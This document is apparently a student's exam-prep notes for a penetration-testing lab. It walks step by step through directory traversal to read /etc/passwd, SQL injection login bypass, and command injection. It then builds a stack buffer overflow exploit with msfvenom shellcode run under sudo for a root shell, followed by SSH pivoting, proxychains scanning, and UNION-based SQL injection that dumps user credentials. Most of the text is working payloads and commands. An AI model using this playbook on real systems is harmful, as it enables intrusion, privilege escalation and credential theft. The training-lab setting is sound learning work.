# Start

- ( Your given the pivot ip, you must enumerate from your linops to get access to it)

**Given : 10.50.14.173**

- (from linops)

**nmap (ip) -T5 2>/dev/null**

**nmap -sV --script=http-enum (ip)**

- (will be given a http port and ssh, so you go into the webbrowser and enter ip w/ port)
(in web browser)

ip:port


- (you will perform web exploitation)

**Look at notes for Web Exploitation and Sql**

- (from the http enum, found the pages you should go to w/ ip)

**(there will be a php that looks into files)** 

**Ex: http://ip/getcareers.php?myfile=**

(note: from here after the = you can change dir by "../" and look into other files)

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/passwd** 

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/hosts**

- ( you will try and find the login page and try the 'OR 1='1)

**right-click on login page --> inspect --> find form method="post" action="login.php"**

-( your going to change **post to get** and then login, then view page source)

- (note: another way would be sql login post)

syntax:

http://ip/login.php?**username='OR 1='1&passwd='OR 1='1**

- (enumerate on the other web extensions you were given to get more information)

(note: you can note that if a page has a decode section, you can enter coded sentences to get decoded)

- (you can go do the page after I got past the login and try and see if it a terminal)
(in browser)

**; whoami**

(note: if so you can run a .ssh keygen and try to exploit machine that way **look at WebExploit notes**)

# Moving into exploiting machine 

- (ip you were given, make a MS and enter creds)

**ssh -MS /tmp/pivot user@ip**

(note: from the box try running cmd **bash** to have a better term)

- (from linops)

(make pivot dynamic to enumerate)

**ssh -S /tmp/pivot pivot -O forward -D 9050**

- (from pivot box)

**sudo -l** : see escalated privs

(note: in this case it gave **/var/tmp/exploit_me**, so I went to the dir and executed the exploit_me to see what it does)

- (can do static analysis)

**strings (exe)**

- (the exe executed)

**./exploit_me (stuffgoeshere)**

- (so try entering some things)

ex: **./exploit_me $(whoami)**

- ( you know that it is a script that is a potential exploit on a machine so you will do exploit development on script)

- (go to linops to make linbuf script)

gdb ./(file)

(maintain gdb session)

shell and can type exit and go back to it

(want to investigate funcitons)

file ; (to see if file is uploaded)

file ./(file ; (to upload file)

info functions ; (to view functions)

(note: the functions with _ are computer default, focus on the ones that don't have it)

Disassembly

run disass_main or pdisass main

(note: what we will be paying attention to is the call to user input, not x86, ect.)

(green is basic, and red colored is more vulnerable)

(to go more into the function)

pdisass getuserinput

(if you were asked what was the vulnerable function in the file and your answer would be one of the red functions, just the name, not the symbol)

Dynamic Analysis Pt II

Fuzzing ; (were going to throw things at the program to see when it breaks)

- (find offset, defile variable offset and set variable as A)

- (to fuzz, create .py script with the offset value, cout into ./(file)

(in the file)

#!/usr/bin/python

offset = "A" * 100

print(offset)

(cout into file)

./func $(python linbuf.py)

- (build off, pinpoint or find EIP, using wiremask) (run script in gdb)

**run  $(python linbuf.py)**

(turn off offset and then user wiremask string)
(in file)

offset = "wiremask val"

print(offset)

- ( rerun in gdb)

**run $(python linbuf.py)**

- ( look at EIP = register value ---> enter value into wiremask register value ---> get value)

- ( after getting real offset value, edit .py script and input real offset found, and creat a value for EIP) 

(in script file)

offset = "A" * 62

eip = "BBB"

print(offset + eip) ; (this points to the next instruction)

- (see if the BBB show in the hex 0x424242)

- ( then you will comment out the eip)


(in file)

#!/usr/bin/python

offset = "A" * 62

#eip = "BBB"

print(offset + eip)

- (your just changing in file dont do anything else)

- (find JMP ESP)

**env - gdb ./func**

(from gdb)

**unset env LINES**

**unset env COLUMNS**

**start**

**step** (ONLY IF YOU HAVE A MORE COMPLICATED PROGRAM)

**info proc map** (might need to file ./(file) then start and info proc map again)

- (looking for the HEAP and STACK) so enter step --> info proc map until you see heap or stack)
(we need to find the JMP within the location between HEAP and STACK)

- ( we are going to run a find cmd to use the address from the values outputted)
syntax: find /b (1st addr after heap),(addr end of stack),0xff,0xe4

- (run in gdb)

**find /b 0xf7de1000,0xffffe000,0xff,0xe4**

- (then take 1st 5 addresses and copy into notes)
addresses from cmd:

0xf7de3b59

0xf7f588ab

0xf7f645fb

0xf7f6460f

0xf7f64aeb

- (then convert addr's to little endian (back to front))
1st addr: 0xf7de3b59 ---> f7 de 3b 59 ---> "\x59\x3b\xde\xf7"

- (in the .py script you will set the eip to the addr you converted into little endian)
(in file)

#!/usr/bin/python

offset= "A" * 55

eip = "\x59\x3b\xde\xf7" 

nop = "\x90" * 15

print(offset + eip + nop)

- from (linops)

- ( then user msfvenom )
  
**msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python**

(note: change the command to what you need to get your answer)

- (after entering cmd, you will be prompted buf += and copy the whole thing and paste into .py script)
(in file)

#!/usr/bin/python

eip = "\x59\x3b\xde\xf7"

nop = "\x90" * 15 

buf = b""
(paste from buf += to end) 


print(offset + eip + nop + buf)

- (now rerun the script from machine with exe **./func $(python linbuf.py)**, and prompt with an answer)
(note: as long as you update msfvenom cmd and change buf in .py script you can run any cmd)

ex:

**msfvenom -p linux/x86/exec CMD="sudo bash" -b "\x00\xfe\x20\x0a\xff" -f python**

(then you just copy the buf back into script and rerun the py script)


- ( go back to the machine your running exe in)

(note that the exe you have sudo perms on)

** sudo ./exploit_me $(python linbuf.py)**

- (then it will prompt you a terminal that you opened via exe with root privs and enumerate the machine)

(note once you get into machine, change password and then ssh into it by making another MS, make it dynamic to enumerate on other ips you find)

- (then start enumerating the machine)

**cat /etc/hosts** : (find an ip that you can touch so you want to ping that network)

**for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done**

- (you will be given some other addresses, and enumerate on it)

- (from linops)

**proxychains nmap (ip) -T4**

**proxychains nmap --script banner.nse ip -T4 -p #,#**

- (your given http and ssh, so make a -S forward to that ip and its ports)
- (in this case you were given two boxes that you can connect to)

**ssh -S /tmp/pivot pivot -O forward -L rhp:ip:port -L rhp:ip:port**

- (after go to webite from browser and enumerate to get creds for the next box)
(from browser)

127.0.0.1:rhp

- (start enumerating the website)

(click around and start figuring stuff out, youll notice the webiste is a sql table)

- (from here you will find the vulnerable table where it lists everything)

(for this it prompts a url)

**127.0.0.1:rhp/pick.php?product=1**

- (for this it matches the sql syntax for URL inject, so try changing the number product= to find what is vulnerable)

**127.0.0.1:rhp/pick.php?product=7** : #7 is the vulnerable that shows all tables

- (Building off of URL)

Blind Injection (Identify Vulnerable Field)

**http://127.0.0.1:10004/.php?Selection=1**  

(note: product= is = to selection=)

(you will just change the # after Selection=# to see what is vulnerable)

- (Identify Number of Columns)

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT 1,2,3**

(Reorder numbers to match ouput of query that it prompts)

**http://127.0.0.1:10004/.php?Selection=2 UNION SELECT 1,3,2**

- (Golden Statement) you will enter to get full database

**http://127.0.0.1:10004/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**

(note: this dumps out entire database)

- (Craft Queries based on database your given)

**(note: you want only to query USER inputed fields which will only be at TOP or BOTTOM of table)**

syntax:

**http://127.0.0.1:10004/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns**

- (now you will adjust syntax to query the table)

(**from the table situeser is the database, id user_id name is the 1,2,3 parameters, and $users is the columns the database queries from**)

ex:   **siteusers|   user_id   | $users**

syntax to querie this:

**http://127.0.0.1:10004/pick.php?product=7 UNION SELECT user_id,name,username FROM situsers.users**

- (this will have prompted you creds)

(note: notice that it gives you previous creds w/ a new one, and they are coded, so go to 1st website and decode them from decode page)

# Exploit Box 3

- (from ssh -S to ips ssh and http port, connect to ip:ssh port)
(from new term)

**ssh -MS /tmp/box3 user@127.0.0.1 -p rhp**

- (now enumerate the box)
(from box)

**bash**

**/etc/hosts**

**sudo -l**

- (run the linuxexploit cmd for SUID/SGUID)



  
